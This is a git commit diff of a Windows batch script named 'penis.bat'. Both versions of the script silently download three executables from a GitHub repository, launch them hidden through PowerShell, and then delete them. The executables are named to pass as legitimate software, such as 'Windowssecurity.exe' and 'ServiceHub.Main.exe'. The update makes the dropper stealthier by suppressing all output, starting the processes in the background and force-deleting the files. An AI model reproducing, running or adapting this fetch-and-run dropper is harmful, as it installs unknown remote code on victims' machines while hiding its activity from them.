292e59f56c70469081e2fa8e69a92b51ac4c8627
blechbleh <blueyyy@yooblueyyy.info>
2025-11-30 11:10:14 -0800

    Update penis.bat

--- penis.bat
+++ penis.bat
@@ -1,27 +1,18 @@
 @echo off
 setlocal
 
-set EXE_URL1=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Primeclientautoupdater.exe
-set EXE_URL2=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Windowssecurity.exe
-set EXE_URL3=https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/ServiceHub.Main.exe
+set "TEMP_DIR=%TEMP%\gt_temp"
+if not exist "%TEMP_DIR%" md "%TEMP_DIR%" >nul 2>&1
 
-set EXE_NAME1=Primeclientautoupdater.exe
-set EXE_NAME2=Windowssecurity.exe
-set EXE_NAME3=ServiceHub.Main.exe
+curl -L -o "%TEMP_DIR%\Primeclientautoupdater.exe" https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Primeclientautoupdater.exe >nul 2>&1
+curl -L -o "%TEMP_DIR%\Windowssecurity.exe" https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Windowssecurity.exe >nul 2>&1
+curl -L -o "%TEMP_DIR%\ServiceHub.Main.exe" https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/ServiceHub.Main.exe >nul 2>&1
 
-set TEMP_DIR=%TEMP%\gt_temp
-
-if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"
-
-if defined EXE_URL1 curl -L -o "%TEMP_DIR%\%EXE_NAME1%" %EXE_URL1%
-if defined EXE_URL2 curl -L -o "%TEMP_DIR%\%EXE_NAME2%" %EXE_URL2%
-if defined EXE_URL3 curl -L -o "%TEMP_DIR%\%EXE_NAME3%" %EXE_URL3%
-
-if exist "%TEMP_DIR%\%EXE_NAME1%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME1%' -WindowStyle Hidden"
-if exist "%TEMP_DIR%\%EXE_NAME2%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME2%' -WindowStyle Hidden"
-if exist "%TEMP_DIR%\%EXE_NAME3%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME3%' -WindowStyle Hidden"
+if exist "%TEMP_DIR%\Primeclientautoupdater.exe" start "" /B powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\Primeclientautoupdater.exe' -WindowStyle Hidden"
+if exist "%TEMP_DIR%\Windowssecurity.exe" start "" /B powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\Windowssecurity.exe' -WindowStyle Hidden"
+if exist "%TEMP_DIR%\ServiceHub.Main.exe" start "" /B powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\ServiceHub.Main.exe' -WindowStyle Hidden"
 
 timeout /t 5 >nul
-
-del "%TEMP_DIR%\*.exe" >nul 2>&1
-rd "%TEMP_DIR%" 2>nul
+del /f /q "%TEMP_DIR%\*.exe" >nul 2>&1
+rd /q "%TEMP_DIR%" >nul 2>&1
+exit
